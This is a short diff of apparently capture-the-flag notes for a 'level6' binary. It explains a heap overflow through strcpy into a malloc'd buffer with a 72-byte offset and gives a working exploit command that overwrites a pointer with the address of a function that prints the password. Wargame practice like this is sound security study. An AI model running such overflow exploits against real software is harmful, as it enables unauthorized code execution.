@@ -1,1 +1,6 @@
-python -c 'print("a"*72 + "\x08\x04\x84\x54"[::-1])' > /tmp/test2
+program does 2 calls to malloc
+then strcpy argv[1] into the malloc
+we can overflow with a pattern
+we can see that the overflow is 72
+we just need to write the adress of function n that cat the pass
+./level6 `python -c 'print("a"*72 + "\x08\x04\x84\x54"[::-1])'`
